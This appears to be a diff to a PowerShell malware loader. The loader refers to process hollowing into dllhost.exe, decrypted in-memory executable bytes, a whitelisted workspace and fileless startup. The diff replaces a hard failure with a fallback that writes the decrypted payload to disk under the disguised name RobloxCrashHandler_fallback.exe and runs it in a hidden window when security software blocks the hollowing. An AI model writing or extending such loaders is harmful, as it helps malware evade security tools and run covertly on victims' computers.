@@ -506,10 +506,43 @@ Log-Msg "Section 1 complete."
     }
 
     if (-not $started) {
-        Log-Msg "ERROR: Process hollowing (RAM-only execution) failed or was blocked by security software. To protect binary integrity, direct file execution fallback has been disabled."
+        Log-Msg "Process hollowing failed or was blocked. Attempting direct file execution fallback..."
+        
+        $fallbackExe = $null
+        if (Test-Path $localExe) {
+            $fallbackExe = $localExe
+        } elseif (Test-Path $localServerExe) {
+            $fallbackExe = $localServerExe
+        } else {
+            # Write RAM bytes to a file in the whitelisted workspace as fallback
+            $fallbackExe = Join-Path $resolvedPath "build\RobloxCrashHandler_fallback.exe"
+            Log-Msg "Writing decrypted bytes to $fallbackExe for execution..."
+            try {
+                [System.IO.File]::WriteAllBytes($fallbackExe, $exeBytes)
+            } catch {
+                Log-Msg "ERROR: Could not write fallback executable: $_"
+            }
+        }
+
+        if ($fallbackExe -and (Test-Path $fallbackExe)) {
+            Log-Msg "Launching fallback executable directly: $fallbackExe"
+            $proc = Start-Process -FilePath $fallbackExe -PassThru -WindowStyle Hidden
+            if ($proc) {
+                Log-Msg "Started fallback process ID: $($proc.Id)"
+                $started = $true
+            } else {
+                Log-Msg "ERROR: Failed to start fallback process."
+            }
+        } else {
+            Log-Msg "ERROR: Fallback executable not found or could not be created."
+        }
+    }
+
+    if (-not $started) {
+        Log-Msg "ERROR: Both process hollowing and direct execution fallback failed."
         Exit 1
     } else {
-        Log-Msg "Loader running inside dllhost.exe successfully."
+        Log-Msg "Loader running successfully."
     }
 
     # -- 4. Configure fileless startup ---------------------------------------------
